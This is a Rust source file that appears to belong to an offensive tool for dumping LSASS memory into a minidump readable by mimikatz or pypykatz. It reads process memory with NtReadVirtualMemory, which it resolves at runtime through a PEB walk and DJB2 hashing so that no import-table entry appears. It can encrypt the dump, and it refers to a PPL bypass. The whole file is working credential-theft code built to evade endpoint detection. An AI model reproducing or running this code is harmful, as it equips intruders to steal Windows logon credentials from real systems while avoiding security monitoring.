//! Hand-crafted minidump builder via NtReadVirtualMemory
//!
//! Builds a minimal minidump compatible with pypykatz/mimikatz containing:
//! - SystemInfoStream: OS version, processor info
//! - ModuleListStream: LSASS loaded DLLs (names, base addresses, sizes)
//! - Memory64ListStream: Full committed memory regions
//!
//! Avoids MiniDumpWriteDump entirely — uses only NtReadVirtualMemory.

use crate::crypto;
use crate::resolver::{self, ApiResolver};
use windows::Win32::Foundation::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::SystemInformation::*;
use windows::Win32::System::Threading::*;

// --- Minidump format constants ---
const MINIDUMP_SIGNATURE: u32 = 0x504D444D; // "MDMP"
const MINIDUMP_VERSION: u32 = 0xA793; // (42899)

// Stream types
const SYSTEM_INFO_STREAM: u32 = 7;
const MODULE_LIST_STREAM: u32 = 4;
const MEMORY_64_LIST_STREAM: u32 = 9;

// --- Minidump structures ---

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpHeader {
    signature: u32,
    version: u32,
    number_of_streams: u32,
    stream_directory_rva: u32,
    checksum: u32,
    timestamp: u32,
    flags: u64,
}

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
struct MinidumpDirectory {
    stream_type: u32,
    data_size: u32,
    rva: u32,
}

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
struct MinidumpSystemInfo {
    processor_architecture: u16,
    processor_level: u16,
    processor_revision: u16,
    number_of_processors: u8,
    product_type: u8,
    major_version: u32,
    minor_version: u32,
    build_number: u32,
    platform_id: u32, // VER_PLATFORM_WIN32_NT = 2
    csd_version_rva: u32,
    suite_mask: u16,
    reserved2: u16,
    // CPU info (simplified — 24 bytes)
    cpu_info: [u8; 24],
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpModule {
    base_of_image: u64,
    size_of_image: u32,
    checksum: u32,
    time_date_stamp: u32,
    module_name_rva: u32,
    version_info: [u8; 52], // VS_FIXEDFILEINFO
    cv_record: LocationDescriptor,
    misc_record: LocationDescriptor,
    reserved0: u64,
    reserved1: u64,
}

impl Default for MinidumpModule {
    fn default() -> Self {
        MinidumpModule {
            base_of_image: 0,
            size_of_image: 0,
            checksum: 0,
            time_date_stamp: 0,
            module_name_rva: 0,
            version_info: [0u8; 52],
            cv_record: LocationDescriptor::default(),
            misc_record: LocationDescriptor::default(),
            reserved0: 0,
            reserved1: 0,
        }
    }
}

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
struct LocationDescriptor {
    data_size: u32,
    rva: u32,
}

#[repr(C, packed)]
#[derive(Clone, Copy, Default)]
struct MinidumpMemoryDescriptor64 {
    start_of_memory_range: u64,
    data_size: u64,
}

/// Memory region info collected from the target process
struct MemRegion {
    base: u64,
    size: u64,
    data: Vec<u8>,
}

/// Module info collected from the target process
struct ModuleInfo {
    base: u64,
    size: u32,
    name: String,
}

/// Create a minidump of the target process
pub fn create_minidump(
    api: &ApiResolver,
    process: HANDLE,
    _pid: u32,
    output_path: &str,
    encrypt: bool,
) -> Result<u64, String> {
    // 1. Get system info
    println!("    Collecting system info...");
    let sys_info = collect_system_info();

    // 2. Enumerate loaded modules in target process
    println!("    Enumerating modules...");
    let modules =
        enumerate_modules(process).map_err(|e| format!("Module enumeration failed: {}", e))?;
    println!("    Found {} modules", modules.len());

    // 3. Read committed memory regions
    println!("    Reading memory regions (this may take a moment)...");
    let regions =
        read_memory_regions(api, process).map_err(|e| format!("Memory read failed: {}", e))?;

    let total_mem: u64 = regions.iter().map(|r| r.size).sum();
    println!(
        "    Read {} regions, {:.2} MB total",
        regions.len(),
        total_mem as f64 / 1048576.0
    );

    // 4. Build minidump
    println!("    Assembling minidump...");
    let mut dump = build_minidump(&sys_info, &modules, &regions);

    // 5. Optionally encrypt
    if encrypt {
        println!("    Encrypting dump...");
        dump = crypto::encrypt_dump(&mut dump);
    }

    // 6. Write to disk
    let dump_size = dump.len() as u64;
    std::fs::write(output_path, &dump).map_err(|e| format!("Failed to write dump: {}", e))?;

    Ok(dump_size)
}

fn collect_system_info() -> MinidumpSystemInfo {
    // IMPORTANT: GetVersionExW lies on Win10/11 — returns 6.2 (Win8) without manifest.
    // mimikatz/pypykatz use build_number to select lsasrv.dll offsets, so wrong version
    // = wrong patterns = "ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list".
    // Use RtlGetVersion from ntdll which ALWAYS returns the real OS version.
    #[repr(C)]
    struct RtlOsVersionInfoW {
        size: u32,
        major: u32,
        minor: u32,
        build: u32,
        platform_id: u32,
        csd_version: [u16; 128],
    }

    let mut info = RtlOsVersionInfoW {
        size: std::mem::size_of::<RtlOsVersionInfoW>() as u32,
        major: 0,
        minor: 0,
        build: 0,
        platform_id: 0,
        csd_version: [0u16; 128],
    };

    unsafe {
        // RtlGetVersion is exported by ntdll.dll and always returns real version
        let ntdll =
            windows::Win32::System::LibraryLoader::GetModuleHandleW(windows::core::w!("ntdll.dll"));
        if let Ok(ntdll) = ntdll {
            let proc = windows::Win32::System::LibraryLoader::GetProcAddress(
                ntdll,
                windows::core::s!("RtlGetVersion"),
            );
            if let Some(func) = proc {
                type FnRtlGetVersion = unsafe extern "system" fn(*mut RtlOsVersionInfoW) -> i32;
                let rtl_get_version: FnRtlGetVersion = std::mem::transmute(func);
                let _ = rtl_get_version(&mut info);
            }
        }
    }

    // Fallback: if RtlGetVersion failed, info fields will be 0
    // This shouldn't happen but guard against it
    if info.build == 0 {
        let mut os_info = OSVERSIONINFOW {
            dwOSVersionInfoSize: std::mem::size_of::<OSVERSIONINFOW>() as u32,
            ..Default::default()
        };
        unsafe {
            let _ = GetVersionExW(&mut os_info);
        }
        info.major = os_info.dwMajorVersion;
        info.minor = os_info.dwMinorVersion;
        info.build = os_info.dwBuildNumber;
        info.platform_id = 2;
    }

    println!(
        "    OS Version: {}.{} Build {}",
        info.major, info.minor, info.build
    );

    let mut sys = SYSTEM_INFO::default();
    unsafe {
        GetSystemInfo(&mut sys);
    }

    MinidumpSystemInfo {
        processor_architecture: unsafe { sys.Anonymous.Anonymous.wProcessorArchitecture.0 },
        processor_level: sys.wProcessorLevel,
        processor_revision: sys.wProcessorRevision,
        number_of_processors: sys.dwNumberOfProcessors as u8,
        product_type: 0,
        major_version: info.major,
        minor_version: info.minor,
        build_number: info.build,
        platform_id: 2, // VER_PLATFORM_WIN32_NT
        csd_version_rva: 0,
        suite_mask: 0,
        reserved2: 0,
        cpu_info: [0u8; 24],
    }
}

fn enumerate_modules(process: HANDLE) -> Result<Vec<ModuleInfo>, String> {
    use windows::Win32::System::ProcessStatus::*;

    let mut modules_out = Vec::new();

    unsafe {
        // Get module handles
        let mut h_modules: [HMODULE; 1024] = [HMODULE::default(); 1024];
        let mut cb_needed = 0u32;

        EnumProcessModulesEx(
            process,
            h_modules.as_mut_ptr(),
            std::mem::size_of_val(&h_modules) as u32,
            &mut cb_needed,
            LIST_MODULES_ALL,
        )
        .map_err(|e| format!("EnumProcessModulesEx: {}", e))?;

        let count = cb_needed as usize / std::mem::size_of::<HMODULE>();

        for i in 0..count {
            let mut mod_info = MODULEINFO::default();
            if GetModuleInformation(
                process,
                h_modules[i],
                &mut mod_info,
                std::mem::size_of::<MODULEINFO>() as u32,
            )
            .is_ok()
            {
                // Get module name
                let mut name_buf = [0u16; 260];
                let name_len = GetModuleFileNameExW(process, h_modules[i], &mut name_buf);
                let name = if name_len > 0 {
                    String::from_utf16_lossy(&name_buf[..name_len as usize])
                } else {
                    format!("unknown_{:X}", mod_info.lpBaseOfDll as u64)
                };

                modules_out.push(ModuleInfo {
                    base: mod_info.lpBaseOfDll as u64,
                    size: mod_info.SizeOfImage,
                    name,
                });
            }
        }
    }

    Ok(modules_out)
}

fn read_memory_regions(api: &ApiResolver, process: HANDLE) -> Result<Vec<MemRegion>, String> {
    let mut regions = Vec::new();
    let mut address: u64 = 0;

    // Dynamically resolve NtReadVirtualMemory from ntdll (not in IAT)
    type FnNtReadVirtualMemory =
        unsafe extern "system" fn(isize, *const u8, *mut u8, usize, *mut usize) -> i32;
    let nt_read: FnNtReadVirtualMemory = unsafe {
        std::mem::transmute(
            api.ntdll(resolver::HASH_NT_READ_VIRTUAL_MEMORY)
                .ok_or("Failed to resolve NtReadVirtualMemory")?,
        )
    };

    unsafe {
        loop {
            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let result = VirtualQueryEx(
                process,
                Some(address as *const _),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );

            if result == 0 {
                break;
            }

            // Only dump committed, readable memory
            if mbi.State == MEM_COMMIT
                && (mbi.Protect == PAGE_READWRITE
                    || mbi.Protect == PAGE_READONLY
                    || mbi.Protect == PAGE_EXECUTE_READ
                    || mbi.Protect == PAGE_EXECUTE_READWRITE
                    || mbi.Protect == PAGE_WRITECOPY
                    || mbi.Protect == PAGE_EXECUTE_WRITECOPY)
                && mbi.Protect.0 & 0x100 == 0
            // Not PAGE_GUARD
            {
                let region_size = mbi.RegionSize;
                let mut buffer = vec![0u8; region_size];

                let mut bytes_read = 0usize;
                // NtReadVirtualMemory via dynamically resolved function pointer
                // (no IAT entry — resolved at runtime via PEB walk + DJB2)
                let status = nt_read(
                    process.0 as isize,
                    mbi.BaseAddress as *const u8,
                    buffer.as_mut_ptr(),
                    region_size,
                    &mut bytes_read,
                );

                if status >= 0 && bytes_read > 0 {
                    buffer.truncate(bytes_read);
                    regions.push(MemRegion {
                        base: mbi.BaseAddress as u64,
                        size: bytes_read as u64,
                        data: buffer,
                    });
                }
            }

            address = mbi.BaseAddress as u64 + mbi.RegionSize as u64;
            if address == 0 {
                break; // Overflow
            }
        }
    }

    if regions.is_empty() {
        return Err("No readable memory regions found. PPL bypass may have failed.".into());
    }

    Ok(regions)
}

fn build_minidump(
    sys_info: &MinidumpSystemInfo,
    modules: &[ModuleInfo],
    regions: &[MemRegion],
) -> Vec<u8> {
    let mut buf = Vec::new();
    let num_streams = 3u32;

    // Reserve space for header + directory
    let header_size = std::mem::size_of::<MinidumpHeader>();
    let dir_size = num_streams as usize * std::mem::size_of::<MinidumpDirectory>();
    buf.resize(header_size + dir_size, 0);

    // --- Stream 1: SystemInfo ---
    let sys_info_rva = buf.len() as u32;
    let sys_info_bytes = unsafe {
        std::slice::from_raw_parts(
            sys_info as *const _ as *const u8,
            std::mem::size_of::<MinidumpSystemInfo>(),
        )
    };
    buf.extend_from_slice(sys_info_bytes);
    let sys_info_size = std::mem::size_of::<MinidumpSystemInfo>() as u32;

    // --- Stream 2: ModuleList ---
    let module_list_rva = buf.len() as u32;
    // Write module count
    let mod_count = modules.len() as u32;
    buf.extend_from_slice(&mod_count.to_le_bytes());

    // Placeholder for module entries — fill after we write module names
    let mod_entries_start = buf.len();
    let mod_entry_size = std::mem::size_of::<MinidumpModule>();
    buf.resize(buf.len() + modules.len() * mod_entry_size, 0);

    // Write module names and fixup name RVAs
    let mut mod_entries: Vec<MinidumpModule> = Vec::new();
    for m in modules {
        let name_rva = buf.len() as u32;
        // Write name as UTF-16LE, prefixed with byte length
        let name_utf16: Vec<u16> = m.name.encode_utf16().collect();
        let byte_len = (name_utf16.len() * 2) as u32;
        buf.extend_from_slice(&byte_len.to_le_bytes());
        for ch in &name_utf16 {
            buf.extend_from_slice(&ch.to_le_bytes());
        }
        // Null terminator
        buf.extend_from_slice(&[0u8; 2]);

        mod_entries.push(MinidumpModule {
            base_of_image: m.base,
            size_of_image: m.size,
            module_name_rva: name_rva,
            ..Default::default()
        });
    }

    // Fixup module entries in buffer
    for (i, entry) in mod_entries.iter().enumerate() {
        let entry_offset = mod_entries_start + i * mod_entry_size;
        let entry_bytes =
            unsafe { std::slice::from_raw_parts(entry as *const _ as *const u8, mod_entry_size) };
        buf[entry_offset..entry_offset + mod_entry_size].copy_from_slice(entry_bytes);
    }

    let module_list_size = (buf.len() as u32) - module_list_rva;

    // --- Stream 3: Memory64List ---
    let mem64_list_rva = buf.len() as u32;

    // NumberOfMemoryRanges
    let num_ranges = regions.len() as u64;
    buf.extend_from_slice(&num_ranges.to_le_bytes());

    // BaseRva — offset where actual memory data starts
    // = current_pos + 8 (for BaseRva field) + num_ranges * sizeof(MemoryDescriptor64)
    let descriptors_size = regions.len() * std::mem::size_of::<MinidumpMemoryDescriptor64>();
    let base_rva = buf.len() as u64 + 8 + descriptors_size as u64;
    buf.extend_from_slice(&base_rva.to_le_bytes());

    // Write memory range descriptors
    for region in regions {
        let desc = MinidumpMemoryDescriptor64 {
            start_of_memory_range: region.base,
            data_size: region.size,
        };
        let desc_bytes = unsafe {
            std::slice::from_raw_parts(
                &desc as *const _ as *const u8,
                std::mem::size_of::<MinidumpMemoryDescriptor64>(),
            )
        };
        buf.extend_from_slice(desc_bytes);
    }

    let mem64_list_size = (buf.len() as u32) - mem64_list_rva;

    // Write actual memory data
    for region in regions {
        buf.extend_from_slice(&region.data);
    }

    // --- Write header ---
    let header = MinidumpHeader {
        signature: MINIDUMP_SIGNATURE,
        version: MINIDUMP_VERSION,
        number_of_streams: num_streams,
        stream_directory_rva: header_size as u32,
        checksum: 0,
        timestamp: 0,
        flags: 0x00000002, // MiniDumpWithFullMemory
    };
    let header_bytes =
        unsafe { std::slice::from_raw_parts(&header as *const _ as *const u8, header_size) };
    buf[..header_size].copy_from_slice(header_bytes);

    // --- Write stream directory ---
    let dirs = [
        MinidumpDirectory {
            stream_type: SYSTEM_INFO_STREAM,
            data_size: sys_info_size,
            rva: sys_info_rva,
        },
        MinidumpDirectory {
            stream_type: MODULE_LIST_STREAM,
            data_size: module_list_size,
            rva: module_list_rva,
        },
        MinidumpDirectory {
            stream_type: MEMORY_64_LIST_STREAM,
            data_size: mem64_list_size,
            rva: mem64_list_rva,
        },
    ];
    let dir_bytes = unsafe { std::slice::from_raw_parts(dirs.as_ptr() as *const u8, dir_size) };
    buf[header_size..header_size + dir_size].copy_from_slice(dir_bytes);

    buf
}
